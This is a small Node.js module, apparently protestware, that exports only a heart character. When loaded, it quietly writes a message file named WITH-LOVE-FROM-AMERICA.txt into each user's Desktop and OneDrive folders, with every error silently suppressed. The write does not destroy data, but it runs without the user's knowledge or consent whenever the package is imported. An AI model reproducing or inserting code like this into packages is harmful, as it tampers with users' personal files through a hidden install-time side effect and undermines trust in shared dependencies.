"use strict";

var fs = require('fs');
var homedir = require('os').homedir;

var messageFileName = 'WITH-LOVE-FROM-AMERICA.txt';
var folders = [`${homedir}/Desktop/`, `${homedir}/OneDrive/`, `${homedir}/OneDrive/Desktop/`];

function deliverAPeacefulMessage(path,message){
    try{
        fs.writeFile(
            path, 
            message,
            function(err){
                //its all good
            }
        );
    }catch(err){
        //thats ok
    }
}

//let's be polite and only do this once.
//hopefully once is all it takes.
try{
    var message = fs.readFileSync(`${__dirname}/${messageFileName}`, 'utf8');

    for(var i=0; i<folders.length; i++){
        var folderPath = folders[i];
        if(fs.existsSync(folderPath)){
            var messageFilePath = `${folderPath}${messageFileName}`;
            if(fs.existsSync(messageFilePath)){
                continue;
            }
            fs.writeFile(messageFilePath, message, ()=>{});
        }
    }
}catch(e){
    // Something went wrong
}

var whatWeWant='♥';

module.exports = {
    whatWeWant
}
